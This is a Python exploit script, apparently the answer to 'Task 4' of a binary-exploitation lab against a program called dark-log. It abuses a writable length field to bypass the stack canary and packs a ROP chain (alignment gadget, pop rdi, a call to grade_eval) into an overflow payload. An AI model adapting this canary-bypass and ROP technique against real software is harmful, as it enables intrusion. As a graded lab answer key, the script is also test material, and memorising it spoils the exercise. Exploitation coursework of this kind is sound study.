#!/usr/bin/env python3
"""Task 4: use the writable `len` field to preserve dark-log's canary."""

import struct
import sys


def qword(value: int) -> bytes:
    return struct.pack("<Q", value)


# `expression` is 128 bytes and `logMsg` follows immediately.  Setting
# f.len=0xA8 makes memcpy() start at f.logMsg + 0xA8 == &input_return_address.
# The direct gets() overflow stops before the canary, so it is preserved.
chain = (
    qword(0x401526)         # ret (stack-alignment gadget)
    + qword(0x4018A3)       # pop rdi; ret
    + qword(4)
    + qword(0x401677)       # grade_eval
)

payload = (
    chain
    + b"A" * (256 - len(chain))
    + struct.pack("<I", 0xA8)
    + b"ZZZZ"
    + b"\n"
)

sys.stdout.buffer.write(payload)
